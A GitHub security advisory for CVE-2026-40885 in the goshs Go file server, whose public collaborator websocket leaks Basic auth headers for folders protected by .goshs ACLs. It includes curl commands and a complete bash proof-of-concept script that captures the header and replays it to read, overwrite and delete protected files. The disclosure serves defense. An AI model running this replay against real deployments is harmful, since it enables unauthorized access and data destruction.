# [H] goshs's public collaborator feed leaks .goshs ACL credentials and enables unauthorized access

## Summary
Severity: High
Advisory: GHSA-7h3j-592v-jcrp
CVE: CVE-2026-40885
CWE: CWE-200
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-7h3j-592v-jcrp
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs/v2` — affected >=2.0.0-beta.4 <2.0.0-beta.6

## Details
### Summary
goshs leaks file-based ACL credentials through its public collaborator feed when the server is deployed without global basic auth. Requests to `.goshs`-protected folders are logged before authorization is enforced, and the collaborator websocket broadcasts raw request headers, including `Authorization`. An unauthenticated observer can capture a victim's folder-specific basic-auth header and replay it to read, upload, overwrite, and delete files inside the protected subtree. I reproduced this on `v2.0.0-beta.5`, the latest supported release as of April 10, 2026.

### Details
The main web UI and collaborator websocket stay public when goshs is started without global `-b user:pass` authentication:

- `httpserver/server.go:72-85` only installs `BasicAuthMiddleware()` when a global username or password is configured

The vulnerable request is logged before `.goshs` authorization is enforced:

- `httpserver/handler.go:277-279` calls `emitCollabEvent()` and `logger.LogRequest()` before the protected file is passed into ACL enforcement
- `httpserver/handler.go:291-309` performs folder-level `.goshs` authentication later in `applyCustomAuth()`

The collaborator pipeline copies and broadcasts every request header:

- `httpserver/collaborator.go:22-46` flattens all request headers, including `Authorization`, into the websocket event and sends them to the hub
- `ws/hub.go:77-84` fans the event out live to all connected websocket clients
- `ws/hub.go:116-122` replays up to 200 prior HTTP events to newly connected websocket clients via catchup

The frontend also makes the leak easier to understand by decoding authorization values:

- `assets/js/main.js:627-645` formats and decodes the `Authorization` header for display in the collaborator panel

In practice, a victim request such as:

```http
GET /ACLAuth/secret.txt
Authorization: Basic YWRtaW46YWRtaW4=
```

is visible to any public websocket observer before the protected file's ACL check is enforced. The attacker can then replay the leaked header against the same protected folder and gain the victim's effective access.

### PoC
Manual verification commands used:

`Terminal 1`

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
go build -o /tmp/goshs_beta5 ./

rm -rf /tmp/goshs_collab_root
mkdir -p /tmp/goshs_collab_root/ACLAuth
cp integration/keepFiles/goshsACLAuth /tmp/goshs_collab_root/ACLAuth/.goshs
printf 'very secret\n' > /tmp/goshs_collab_root/ACLAuth/secret.txt

/tmp/goshs_beta5 -d /tmp/goshs_collab_root -p 18096
```

`Terminal 2`

```bash
node - <<'NODE'
const ws = new WebSocket('ws://127.0.0.1:18096/?ws');
ws.onmessage = (ev) => console.log(ev.data.toString());
NODE
```

`Terminal 3`

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:18096/ACLAuth/secret.txt
curl -s -u admin:admin http://127.0.0.1:18096/ACLAuth/secret.txt
curl -s -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://127.0.0.1:18096/ACLAuth/secret.txt
curl -s -o /dev/null -w '%{http_code}\n' -H 'Authorization: Basic YWRtaW46YWRtaW4=' -X PUT --data-binary 'owned' http://127.0.0.1:18096/ACLAuth/pwn.txt
curl -s -o /dev/null -w '%{http_code}\n' -H 'Authorization: Basic YWRtaW46YWRtaW4=' 'http://127.0.0.1:18096/ACLAuth/secret.txt?delete'
```

Two terminal commands I ran during local validation:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:18096/ACLAuth/secret.txt
curl -s -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://127.0.0.1:18096/ACLAuth/secret.txt
```

Observed results from manual verification:

- the anonymous request returned `401`
- the victim request returned `very secret`
- the replayed leaked header also returned `very secret`
- the replayed `PUT` returned `200`
- the replayed `?delete` returned `200`
- the public websocket showed `Authorization":"Basic YWRtaW46YWRtaW4="`

PoC Video 1:

https://github.com/user-attachments/assets/1347838e-28a0-4c9f-be9f-db7e2938c752



Single-script verification:

```bash
'/Users/r1zzg0d/Documents/CVE hunting/output/poc/gosh_poc4'
```

Observed script result:

- `Captured header: Basic YWRtaW46YWRtaW4=`
- `Anonymous GET status: 401`
- `Replayed-header GET body: very secret`
- `Replayed-header PUT status: 200`
- `Replayed-header delete status: 200`
- `[RESULT] VULNERABLE: public collaborator feed leaked ACL credentials that unlocked the protected subtree`

PoC Video 2:

https://github.com/user-attachments/assets/b25648a9-b96c-46b3-9ee4-0ae4cc1c3472



`gosh_poc4` script content:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
FIXTURE='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5/integration/keepFiles/goshsACLAuth'
BIN='/tmp/goshs_beta5_collab_leak'
PORT='18096'
WORKDIR="$(mktemp -d /tmp/goshs-collab-beta5-XXXXXX)"
ROOT="$WORKDIR/root"
WS_LOG="$WORKDIR/ws.log"
GOSHS_PID=""
WATCH_PID=""

cleanup() {
  if [[ -n "${WATCH_PID:-}" ]]; then
    kill "${WATCH_PID}" >/dev/null 2>&1 || true
    wait "${WATCH_PID}" 2>/dev/null || true
  fi
  if [[ -n "${GOSHS_PID:-}" ]]; then
    kill "${GOSHS_PID}" >/dev/null 2>&1 || true
    wait "${GOSHS_PID}" 2>/dev/null || true
  fi
}
trap cleanup EXIT

mkdir -p "${ROOT}/ACLAuth"
cp "${FIXTURE}" "${ROOT}/ACLAuth/.goshs"
printf 'very secret\n' > "${ROOT}/ACLAuth/secret.txt"

echo "[1/6] Building goshs beta.5"
(cd "${REPO}" && go build -o "${BIN}" ./)

echo "[2/6] Starting goshs without global auth on 127.0.0.1:${PORT}"
"${BIN}" -d "${ROOT}" -p "${PORT}" >"${WORKDIR}/goshs.log" 2>&1 &
GOSHS_PID=$!

for _ in $(seq 1 40); do
  if curl -s "http://127.0.0.1:${PORT}/" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

echo "[3/6] Opening an unauthenticated websocket observer"
node - <<'NODE' >"${WS_LOG}" &
const ws = new WebSocket('ws://127.0.0.1:18096/?ws');
ws.onopen = () => console.log('OPEN');
ws.onmessage = (ev) => {
  const msg = ev.data.toString();
  console.log(msg);
  if (msg.includes('Authorization')) process.exit(0);
};
setTimeout(() => process.exit(0), 10000);
NODE
WATCH_PID=$!

echo "[4/6] Simulating a victim request with folder credentials"
curl -s -u admin:admin "http://127.0.0.1:${PORT}/ACLAuth/secret.txt" >/dev/null
wait "${WATCH_PID}" || true
WATCH_PID=""

LEAKED_HEADER="$(python3 - "${WS_LOG}" <<'PY'
import pathlib
import re
import sys

text = pathlib.Path(sys.argv[1]).read_text()
m = re.search(r'Basic [A-Za-z0-9+/=]+', text)
print(m.group(0) if m else '')
PY
)"

if [[ -z "${LEAKED_HEADER}" ]]; then
  echo "[ERROR] No leaked Authorization header was captured." >&2
  echo "[DEBUG] Websocket output:" >&2
  cat "${WS_LOG}" >&2
  exit 1
fi

echo "[5/6] Replaying the leaked header as the attacker"
UNAUTH_CODE="$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT}/ACLAuth/secret.txt")"
READ_BACK="$(curl -s -H "Authorization: ${LEAKED_HEADER}" "http://127.0.0.1:${PORT}/ACLAuth/secret.txt")"
PUT_CODE="$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: ${LEAKED_HEADER}" -X PUT --data-binary 'owned' "http://127.0.0.1:${PORT}/ACLAuth/pwn.txt")"
DELETE_CODE="$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: ${LEAKED_HEADER}" "http://127.0.0.1:${PORT}/ACLAuth/secret.txt?delete")"

if [[ "${UNAUTH_CODE}" != "401" ]]; then
  echo "[ERROR] Expected anonymous direct access to fail with 401, got ${UNAUTH_CODE}." >&2
  exit 1
fi

if [[ "${READ_BACK}" != "very secret" ]]; then
  echo "[ERROR] Replayed header did not unlock the protected file." >&2
  exit 1
fi

if [[ "${PUT_CODE}" != "200" ]]; then
  echo "[ERROR] Expected replayed-header PUT to return 200, got ${PUT_CODE}." >&2
  exit 1
fi

if [[ "${DELETE_CODE}" != "200" ]]; then
  echo "[ERROR] Expected replayed-header delete to return 200, got ${DELETE_CODE}." >&2
  exit 1
fi

if [[ ! -f "${ROOT}/ACLAuth/pwn.txt" ]]; then
  echo "[ERROR] PUT did not create pwn.txt." >&2
  exit 1
fi

if [[ -f "${ROOT}/ACLAuth/secret.txt" ]]; then
  echo "[ERROR] Delete did not remove secret.txt." >&2
  exit 1
fi

echo "[6/6] Results"
echo "Captured header: ${LEAKED_HEADER}"
echo "Anonymous GET status: ${UNAUTH_CODE}"
echo "Replayed-header GET body: ${READ_BACK}"
echo "Replayed-header PUT status: ${PUT_CODE}"
echo "Replayed-header delete status: ${DELETE_CODE}"
echo "[RESULT] VULNERABLE: public collaborator feed leaked ACL credentials that unlocked the protected subtree"
```

### Impact
This issue is a sensitive information disclosure that becomes an authentication bypass against `.goshs`-protected content. Any unauthenticated observer who can access the public collaborator websocket can steal folder-level basic-auth credentials from a victim request and immediately reuse them to read, upload, overwrite, or delete files inside the protected subtree. Deployments that rely on public goshs access with selective `.goshs`-protected subfolders are directly exposed.

### Remediation
Suggested fixes:

1. Never store or broadcast sensitive headers such as `Authorization`, `Cookie`, or `Proxy-Authorization` in collaborator events.
2. Move collaborator logging until after access-control checks, and log only minimal metadata instead of raw headers and bodies.
3. Protect the collaborator websocket and panel with the same or stronger authentication boundary as the resources being observed.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-7h3j-592v-jcrp
- https://nvd.nist.gov/vuln/detail/CVE-2026-40885
- https://github.com/patrickhener/goshs
